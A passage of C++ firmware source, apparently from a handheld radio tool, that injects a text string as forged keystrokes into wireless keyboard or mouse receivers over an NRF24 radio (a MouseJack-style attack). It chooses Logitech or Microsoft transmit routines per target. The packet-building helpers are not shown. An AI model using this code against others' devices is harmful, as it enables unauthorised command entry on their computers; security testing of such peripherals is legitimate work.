  }
  r->flush_tx();
}

void NRF24Screen::_injectMjText(int targetIdx, const String& text) {
  if (targetIdx < 0 || targetIdx >= (int)_mjCount) return;
  const MjTarget& t = _mjTargets[targetIdx];
  auto* r = _nrf.radio();
  if (!r) return;
  r->stopListening();

  for (int i = 0; i < (int)text.length(); i++) {
    char c = text.charAt(i);
    HidKey hk;
    if (!_asciiToHid(c, hk)) continue;
    if (t.type == 3) _logTransmit(t, hk.mod, hk.key);
    else             _msTransmit(t, hk.mod, hk.key);
    delay(10);
  }
  _setupMjScan();
}